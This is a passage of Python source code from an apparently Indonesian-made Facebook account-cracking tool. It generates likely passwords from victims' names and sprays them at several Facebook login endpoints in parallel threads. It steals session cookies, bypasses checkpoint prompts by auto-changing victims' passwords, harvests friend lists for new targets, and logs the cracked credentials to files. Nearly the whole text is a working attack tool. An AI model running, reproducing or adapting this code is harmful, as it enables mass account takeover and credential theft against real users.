                elif _cokzz_ in ['1','01','y']:pass
                elif _cokzz_ in ['2','0','n']:menu()
                else:pass
        else:_azimvau_dapunta_('list_id.txt',"a+").write("%s\n"%(_id_))
    except:pass

### Generate Password
def generate1(_cici_):
    _azimvau_=[]
    for i in _cici_.split(" "):
        if len(i)<3:continue 
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_azimvau_.append(i+"123");_azimvau_.append(i+"12345");_azimvau_.append(i+"123456789");_azimvau_.append(i+"1234");_azimvau_.append(i+"123456")
            elif len(i)>=6:_azimvau_.append(i);_azimvau_.append(i+"123");_azimvau_.append(i+"12345");_azimvau_.append(i+"123456789");_azimvau_.append(i+"1234");_azimvau_.append(i+"123456")
            else:continue
    _azimvau_.append(_cici_.lower())
    return _azimvau_

def generate2(_cici_):
    _azimvau_=[]
    for i in _cici_.split(" "):
        if len(i)<3:continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_azimvau_.append(i+"123");_azimvau_.append(i+"1234");_azimvau_.append(i+"12345")
            else:_azimvau_.append(i);_azimvau_.append(i+"12");_azimvau_.append(i+"2000");_azimvau_.append(i+"1234");_azimvau_.append(i+"11223344")
    _azimvau_.append(_cici_.lower());_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1])
    return _azimvau_

def generate3(_cici_):
    _azimvau_=[]
    for i in _cici_.split(" "):
        if len(i)<3:continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_azimvau_.append(i+"123");_azimvau_.append(i+"1234");_azimvau_.append(i+"12345");_azimvau_.append(i+"2002")
            else:_azimvau_.append(i);_azimvau_.append(i+"12345678");_azimvau_.append(i+"12");_azimvau_.append(i+"123");_azimvau_.append(i+"1234");_azimvau_.append(i+"12345");_azimvau_.append(i.upper()+"123");_azimvau_.append(i+"2001");_azimvau_.append(i+"123456789")
    _azimvau_.append(_cici_.lower());_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]);_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12");_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"123");_azimvau_.append("1122334455")
    return _azimvau_


def generate4(_cici_):
    _azimvau_=[]
    ps = _azimvau_dapunta_('pass.txt','r').read()
    pp = _azimvau_dapunta_('digitpass.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:_azimvau_.append(i+"123");_azimvau_.append(i+"12345")
        else:_azimvau_.append(i);_azimvau_.append(i+"123");_azimvau_.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):_azimvau_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):_azimvau_.append(z)
    _azimvau_.append(_cici_.lower())
    return _azimvau_
def tambah_pass():
    print('%s '%(O));print('%s [%s•%s] %sEXAMPLE : %778899,123456,102030,786786'%(H,P,H,K,H));cuy = _cici_azimvau_('%s [%s•%s] %sENTER MANUAL SUPPLEMENTAL PASS [1 WORD] : '%(H,P,H,K));gh = _azimvau_dapunta_('pass.txt','w');gh.write(cuy);gh.close
def tambah_pass_angka():
    print('%s [%s•%s] %sEXAMPLE : %s143,786,gaming'%(H,P,H,K,H));coy = _cici_azimvau_('%s [%s•%s] %sENTER ADDITIONAL PASS BEHIND NAME : '%(H,P,H,K));xy = _azimvau_dapunta_('digitpass.txt','w');xy.write(coy);xy.close
    
### Logger Crack
def log_api_1(em,pas):
    ua = _azimvau_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_api_2(em,pas):
    ua = _azimvau_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_1(em,pas):
    ua = _azimvau_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_2(em,pas):
    ua = _azimvau_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mobile_1(em,pas):
    ua = _azimvau_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7"})
    p = r.get("https://m.facebook.com/")
    b = r.post("https://m.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mobile_2(em,pas):
    ua = _azimvau_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7"})
    p = r.get("https://m.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}

### Check Opsi
def cek_opsi(user,pw,format):
    _req_ses_ = requests.Session()
    try:cek_dev_opsi          = open('option_.txt','r').read()
    except:cek_dev_opsi       = 'null'
    try:_auto_change_pass_    = open('auto_ganti.txt','r').read()
    except:_auto_change_pass_ = 'Yes'
    try:cek_pilih_opsi        = open('muncul_opsi.txt','r').read()
    except:cek_pilih_opsi     = 'No'
    _req_ses_.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua_xiaomi});_sop_dev_ = par(_req_ses_.get(host+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser");_linkurl_ = _sop_dev_.find("form",{"method":"post"})
    for _cici_ in _sop_dev_("input"):data_1.update({_cici_.get("name"):_cici_.get("value")})
    data_1.update({"email":user,"pass":pw});_url_post_ = _req_ses_.post(host+_linkurl_.get("action"),data=data_1);_response_ = par(_url_post_.text, "html.parser")
    if "c_user" in _req_ses_.cookies.get_dict():
        if "your account has been locked" in _url_post_.text:pass
        else:_cookies_ = ''.join(_req_ses_.cookies.get_dict());_result_ok_ = "\r %s[%SUCCESSFULL%s] %s • %s%s%s          "%(H,P,H,user,pw,tahun(user),P);cek_apk(_result_ok_,cvt_cookies(_cookies_))
    elif "checkpoint" in _req_ses_.cookies.get_dict():
        _ratya_ = 0;jumlah_opsi  = [];_title_dev_ = re.findall("\<title>(.*?)<\/title>",str(_response_));link_2 = _response_.find("form",{"method":"post"});list_input = ['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for _azimvau_ in _response_("input"):
            if _azimvau_.get("name") in list_input:data_2.update({_azimvau_.get("name"):_azimvau_.get("value")})
        _req_act_ = _req_ses_.post(host+link_2.get("action"),data=data_2);_response2_ = par(_req_act_.text,"html.parser");_check_opsi_  = [_salsabila_.text for _salsabila_ in _response2_.find_all("option")]
        if len(_check_opsi_)==0:
            if "Check the login details shown. Was it you?" in _title_dev_:
                if _auto_change_pass_ == 'Yes':change_pass(user,_req_ses_,_response_,link_2)
                else:
                    if cek_pilih_opsi == 'Yes':print(format);print('   %s• %sONE TAP ACCOUNT'%(H,P));print("")
                    else:print(format);print('   %s• %sONE TAP ACCOUNT'%(H,P))
            else:pass
        elif len(_check_opsi_)!=0:
            if cek_pilih_opsi == 'Yes':
                for _asu_ in range(len(_check_opsi_)):_ratya_ += 1;jumlah_opsi.append("\n     "+P+str(_asu_+1)+". "+_check_opsi_[_asu_]+" ")
                jumop = ('%s   HERE ARE %s OPTIONS : '%(P,str(len(jumlah_opsi))));print(format);print(jumop+"".join(jumlah_opsi));print("")
            else:print(format)
    else:
        if 'result' in cek_dev_opsi:print(format);print("%s   [%s!%s] %sPASSWORD HAS CHANGED :("%(P,M,P,M));print('')
        else:print(format)

### Ganti Password
def auto_ganti_pass(_piye_):
    while True:
        _gimana_ = _cici_azimvau_('%s [%s•%s] %sCHANGE ONE TAP ACCOUNT PASS? [Y/n] : '%(H,P,H,K))
        if _gimana_ in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        elif _gimana_ in ['1','01','001','y','Y']:
            open('auto_ganti.txt','w').write('Yes');_newpass_ = _cici_azimvau_('%s [%s•%s] %sENTER ONE TAP PASSWORD : '%(H,P,H,K))
            if len(_newpass_)<6:print('%s [%s!%s] %sSandi Minimal 6 Karakter'%(M,P,M,P));time.sleep(3);menu()
            else:open('_new_pass_.txt','w').write(_newpass_)
            if _piye_ == 'Yes':open('muncul_opsi.txt','w').write('Yes')
            elif _piye_ == 'No':open('muncul_opsi.txt','w').write('No')
            else:open('muncul_opsi.txt','w').write('No')
            break
        elif _gimana_ in ['2','02','002','N','n']:open('auto_ganti.txt','w').write('No');pass
        else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        break
def change_pass(user,_req_ses_,_response_,link_2):
    global ok,cp
    files_ok = "OK/%s.txt"%(tanggal)
    try:_new_pass_ = open('_new_pass_.txt','r').read()
    except:_new_pass_ = 'azimvau-_'
    _password_ = ''.join(_new_pass_);_result_ok_ = "\r %s[%sSUCCESSFULL%s] %s • %s%s%s          "%(H,P,H,user,_password_,tahun(user),P);_button_dev_ = ["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for _azimvau_ in _response_("input"):
        if _azimvau_.get("name") in _button_dev_:data_change_1.update({_azimvau_.get("name"):_azimvau_.get("value")})
    _ganti_pass_ = _req_ses_.post(host+link_2.get("action"),data=data_change_1).text;_result_pass_ = par(_ganti_pass_,"html.parser");_link_3_ = _result_pass_.find("form",{"method":"post"});_button_dev__2_ = ["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Create a new password" in re.findall("\<title>(.*?)<\/title>",str(_ganti_pass_)):
        for _cici_ in _result_pass_("input"):
            if _cici_.get("name") in _button_dev__2_:data_change_2.update({_cici_.get("name"):_cici_.get("value")})
        data_change_2.update({"password_new":_password_});_ses_final_ = _req_ses_.post(host+_link_3_.get("action"),data=data_change_2);_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in _req_ses_.cookies.get_dict().items()]);__cookies__ = cvt_cookies(_cookies_);cek_apk(_result_ok_,__cookies__);ok.append("%s•%s"%(user,_password_));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(user,_password_));cp -= 1;pass
    else:pass

### Cek Aplikasi
def cek_apk(h_ok,_azimvau_):
    apk = [];ses_ = requests.Session()
    cek_pilih_opsi = open('muncul_opsi.txt','r').read()
    url = "https://mbasic.facebook.com/settings/instant_games/tabbed/?tab=active";dat_game = ses_.get(url,cookies={'cookie':_azimvau_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:celeng = asu.find('span').text;apk.append('\n   Connect: '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/instant_games/tabbed/?tab=inactive";dat_game = ses_.get(url2,cookies={'cookie':_azimvau_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:celeng = asu.find('span').text;apk.append('\n   Connect: '+celeng)
        except:pass
    if cek_pilih_opsi == 'Yes':print(h_ok+''.join(apk));print('')
    elif cek_pilih_opsi == 'No':print(h_ok+''.join(apk))

### Cek Tahun Pembuatan
def tahun(fx):
    if (re.findall("[a-zA-Z]",str(fx))):tahunz=''
    else:
        if len(fx)==15:
            if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
            elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
            elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
            elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
            elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
            elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
            elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
            elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
            elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
            elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
            elif fx[:6] in ['100009']          :tahunz = ' • 2015'
            elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
            elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
            elif fx[:5] in ['10003']           :tahunz = ' • 2018/2019'
            elif fx[:5] in ['10004']           :tahunz = ' • 2019/2020'
            elif fx[:5] in ['10005']           :tahunz = ' • 2020'
            elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
            else:tahunz=''
        elif len(fx) in [9,10]:tahunz = ' • 2008/2009'
        elif len(fx)==8:tahunz = ' • 2007/2008'
        elif len(fx)==7:tahunz = ' • 2006/2007'
        else:tahunz=''
    return tahunz

### Convert Cookies
def cvt_cookies(raw_cookies):
    o = {}
    # _raw_cookies_warvest_ = c_user,datr,dnonce,fr,sb,xs
    # _raw_cookies_aap_     = c_user,fr,sb,xs,datr
    # _cooked_cookies_      = sb,datr,c_user,xs,fr
    kiko = raw_cookies.replace(' ','').split(';')
    for x in kiko:
        y = x.split('=')[0]
        z = x.split('=')[1]
        o.update({y:z})
    cooked_cookies = ('sb=%s; datr=%s; c_user=%s; xs=%s; fr=%s'%(o['sb'],o['datr'],o['c_user'],o['xs'],o['fr']))
    #_cookies_ = {'cookie':cooked_cookies}
    #print(cooked_cookies)
    return cooked_cookies

### Metode Crack
def pilih_methode():
    try:os.remove('method.txt')
    except:pass
    while True:
        start_method()
        put = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
        if put in ['',' ','  ']:cok = open('method.txt','w');cok.write('methode_mbasic_v1');cok.close()
        elif put in ['1','01','001','a']:cok = open('method.txt','w');cok.write('methode_api_v1');cok.close()
        elif put in ['2','02','002','b']:cok = open('method.txt','w');cok.write('methode_api_v2');cok.close()
        elif put in ['3','03','003','c']:cok = open('method.txt','w');cok.write('methode_mbasic_v1');cok.close()
        elif put in ['4','04','004','d']:cok = open('method.txt','w');cok.write('methode_mbasic_v2');cok.close()
        elif put in ['5','05','005','e']:cok = open('method.txt','w');cok.write('methode_mobile_v1');cok.close()
        elif put in ['6','06','006','f']:cok = open('method.txt','w');cok.write('methode_mobile_v2');cok.close()
        else:cok = open('method.txt','w');cok.write('methode_mbasic_v1');cok.close()
        break

### Crack
class crack:
    def __init__(self,files):
        global ok,cp
        self.ada = ok;self.cp = cp;self.ko = 0
        self._hayo_mau_recode_ = "12345"
        if len(self._hayo_mau_recode_) == 5:pass
        else:
            try:os.remove(files)
            except:print("FUCK")
        try:os.remove('option_.txt')
        except:pass
        cik = open('option_.txt','w');cik.write('null');cik.close()
        while True:
            pilih_methode();print('%s '%(O));print('%s [%s•%s] %sCRACK WITH DEFAULT / MANUAL PASSWORD %s[%sd%s/%sm%s]'%(H,P,H,B,P,H,P,K,P))
            _pilih_sandi_ = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
            if _pilih_sandi_=="":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
            elif _pilih_sandi_ in ['m','M','2','02','002']:
                try:
                    while True:
                        try:self.apk = files;self.fs = _azimvau_dapunta_(self.apk).read().splitlines();break
                        except Exception as e:print ("   %s"%(e));continue
                    self.fl = []
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:print(("   %s"%e));continue
                print('%s [%s•%s] %sEXAMPLE : %sNIGERIAN,123456,123456654321'%(H,P,H,K,H));self.pwlist();break
            elif _pilih_sandi_ in ['d','D','1','01','001']:
                try:
                    while True:
                        try:self.apk = files;self.fs = _azimvau_dapunta_(self.apk).read().splitlines();break
                        except Exception as e:print ("   %s"%(e));continue
                    self.fl = [];start_methodezz();kopi = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
                    if kopi in ['']:
                        jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P))
                        menu()
                    elif kopi in ['1','01']:
                        for i in self.fs:
                            try:self.fl.append({"id":i.split("•")[0],"pw":generate1(i.split("•")[1])})
                            except:continue
                    elif kopi in ['2','02']:
                        for i in self.fs:
                            try:self.fl.append({"id":i.split("•")[0],"pw":generate2(i.split("•")[1])})
                            except:continue
                    elif kopi in ['3','03']:
                        for i in self.fs:
                            try:self.fl.append({"id":i.split("•")[0],"pw":generate3(i.split("•")[1])})
                            except:continue
                    elif kopi in ['4','04']:
                        try:os.remove('pass.txt')
                        except:pass
                        try:os.remove('digitpass.txt')
                        except:pass
                        tambah_pass();tambah_pass_angka()
                        for i in self.fs:
                            try:self.fl.append({"id":i.split("•")[0],"pw":generate4(i.split("•")[1])})
                            except:continue
                    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
                    try:os.remove('cp_option.txt')
                    except:pass
                    print('%s '%(O));puf = _cici_azimvau_('%s [%s•%s] %sBRING UP CP OPTIONS? [Y/n] : '%(H,P,H,K))
                    if puf in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
                    elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Yes');cok = open('cp_option.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
                    elif puf in ['2','02','002','n','N']:auto_ganti_pass('No');cok = open('cp_option.txt','w');cok.write('null');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
                    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
                except Exception as e:print(("   %s"%e))
    def pwlist(self):
        self.pw = _cici_azimvau_('%s [%s•%s] %sENTER PASSWORD : '%(K,P,K,H)).split(",")
        if len(self.pw) ==0:self.pwlist()
        else:
            for i in self.fl:i.update({"pw":self.pw})
            try:os.remove('cp_option.txt')
            except:pass
            print('%s '%(O));puf = _cici_azimvau_('%s [%s•%s] %sPOP UP CP OPTIONS? [Y/n] : '%(H,P,H,K))
            if puf in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
            elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Yes');cok = open('cp_option.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
            elif puf in ['2','02','002','n','N']:auto_ganti_pass('No');cok = open('cp_option.txt','w');cok.write('null');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
            else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    def start_crack(self,fl):
        try:
            metode = open('method.txt','r').read()
            for i in fl.get("pw"):
                if 'methode_api_v1' in metode:log = log_api_1(fl.get("id"),i)
                elif 'methode_api_v2' in metode:log = log_api_2(fl.get("id"),i)
                elif 'methode_mbasic_v1' in metode:log = log_mbasic_1(fl.get("id"),i)
                elif 'methode_mbasic_v2' in metode:log = log_mbasic_2(fl.get("id"),i)
                elif 'methode_mobile_v1' in metode:log = log_mobile_1(fl.get("id"),i)
                elif 'methode_mobile_v2' in metode:log = log_mobile_2(fl.get("id"),i)
                else:log = log_mbasic_1(fl.get("id"),i)
                if log.get("status")=="cp":
                    files_cp = "CP/%s.txt"%(tanggal)
                    if fl.get("id") in files_cp:pass
                    else:
                        try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _azimvau_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
                        except:ttll = (''%())
                        h_cp = "\r %s[%sCP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                        self.cp.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
                elif log.get("status")=="ok":
                    files_ok = "OK/%s.txt"%(tanggal)
                    if fl.get("id") in files_ok:pass
                    else:
                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sSUCCESSFULL%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
                        else:print("\r %s[%sSUCCESSFULL%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                        self.ada.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
            print("\r %s[%sCracking%s][%s%s/%s%s][%sGOOD:%s%s][%sCP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
        except:self.start_crack(fl)


### Mendapat Jumlah Teman Target
def teman_target():
    it = _cici_azimvau_('%s [%s•%s] %sTARGET ID :%s '%(H,P,H,K,H))
    try:token = _azimvau_dapunta_('token.txt','r').read();mm = _req_get_('https://graph.facebook.com/%s?access_token=%s'%(it,token));nn = _js_lo_(mm.text);print ('%s [%s•%s] %sNAME : %s'%(H,P,H,K,nn['name']))
    except (KeyError,IOError):jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));menu_log()
    tt=[];te=[];lim = _cici_azimvau_('%s [%s•%s] %sDUMP LIMIT : %s'%(H,P,H,K,H));print('%s %s'%(O,P));ada = _req_get_('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token));idi = _js_lo_(ada.text)
    for x in idi['data']:tt.append(x['id'])
    for id in tt:
        try:
            ada2 = _req_get_('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token));idi2 = _js_lo_(ada2.text)
            try:
                for b in idi2['data']:te.append(b['id'])
            except KeyError:print(' [!] PRIVATE')
            print(' [•]',id,'•',len(te));te.clear()
        except KeyError:print('%s [!] SPAM ACCOUNT...!'%(M))
    print(' ');_cici_azimvau_(' [ BACK ]');menu()

### Menu Mengecek result Crack
def result():
    clear()
    banner()
    jalan('%s [ %sCRACK RESULTS %s]'%(H,P,H));print('%s '%(O));print('%s [%s1%s] %sCHECK RESULTS OK'%(H,P,H,K));print('%s [%s2%s] %sCHECK RESULTS CP'%(H,P,H,P));ch = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN OK FILE %s]'%(H,P,H));print('%s '%(O))
            for file in okl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sSUCCESSFUL%s] %s'%(H,P,H,yyy))
